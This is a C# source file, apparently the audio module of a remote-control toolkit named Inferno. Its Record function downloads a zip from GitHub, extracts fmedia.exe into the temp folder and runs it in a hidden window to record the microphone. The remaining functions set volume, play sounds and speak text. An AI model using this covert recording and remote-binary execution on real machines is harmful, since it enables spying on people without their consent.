using AudioSwitcher.AudioApi.CoreAudio;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Speech.Synthesis;

namespace Inferno
{
    internal class audio
    {
        // Output
        private static dynamic output = new System.Dynamic.ExpandoObject();

        private static string fmediaFILE = "fmedia.exe";
        private static string fmediaPATH = Environment.GetEnvironmentVariable("temp") + "\\fmedia\\";
        private static string fmediaLINK = "https://raw.githubusercontent.com/LimerBoy/hackpy/master/modules/audio.zip";


        // Record audio from microphone
        public static void Record(int time, string filename = "recording.wav")
        {
            // Check if fmedia.exe file exists
            if (!File.Exists(fmediaPATH + fmediaFILE))
            {
                string tempArchive = fmediaPATH + "fmedia.zip";
                Directory.CreateDirectory(fmediaPATH);
                WebClient webClient = new WebClient();
                webClient.DownloadFile(fmediaLINK, tempArchive);
                ZipFile.ExtractToDirectory(tempArchive, fmediaPATH);
                File.Delete(tempArchive);
            }
            // Check if file exists
            if (File.Exists(filename))
            {
                File.Delete(filename);
            }
            // Record audio
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = fmediaPATH + fmediaFILE;
            startInfo.Arguments = "--record --until=" + time + " -o " + filename;
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
            // Check
            if (File.Exists(filename))
            {
                output.filename = filename;
                output.seconds = time;
                core.Exit("Microphone recording saved", output);
            }
            else
            {
                output.error = true;
                core.Exit("Microphone not recording saved", output, 3);
            }
        }


        // Set system volume
        public static void setVolume(string volume)
        {
            CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;
            //Debug.WriteLine("Current Volume:" + defaultPlaybackDevice.Volume);
            defaultPlaybackDevice.Volume = Int32.Parse(volume);
            core.Exit("System volume set to " + volume, output);
        }


        // Get system volume
        public static void getVolume()
        {
            CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;
            output.volume = defaultPlaybackDevice.Volume;
            core.Exit("System volume received!", output);
        }


        // Play audio (.wav)
        public static void Play(string filename)
        {
            // Check file
            if (!File.Exists(filename))
            {
                output.error = true;
                core.Exit("Failed to play wav file " + filename + " not found!", output, 1);
            }
            else
            {
                System.Media.SoundPlayer player = new System.Media.SoundPlayer(filename);
                player.Load();
                player.Play();
                output.filename = filename;
                core.Exit("Audio played!", output);
            }
        }


        // Beep
        public static void Beep(string frequency, string duration)
        {
            Console.Beep(Int32.Parse(frequency), Int32.Parse(duration));
            output.frequency = frequency;
            output.duration = duration;
            core.Exit("Beep completed!", output);
        }


        // Text to Speech
        public static void Speak(string text)
        {
            SpeechSynthesizer synthesizer = new SpeechSynthesizer();
            synthesizer.Volume = 100;  // 0...100
            synthesizer.Rate = -2;     // -10...10
            synthesizer.Speak(text);
            core.Exit("Text speak completed!", output);
        }


    }
}